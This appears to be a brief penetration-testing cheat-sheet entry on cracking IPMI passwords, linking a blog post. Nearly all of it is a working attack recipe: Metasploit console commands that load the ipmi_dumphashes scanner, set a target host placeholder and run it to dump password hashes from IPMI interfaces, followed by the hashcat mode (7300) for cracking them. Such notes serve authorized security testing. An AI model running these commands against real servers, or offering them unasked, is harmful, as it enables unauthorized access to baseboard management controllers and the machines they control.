Intelligent Platform Management Interface , 

## Cracking IPMI  Passwords (MSF)
https://gbe0.com/posts/security/cracking-ipmi-passwords/
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOST <IP>
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```
`hashcat -m 7300`
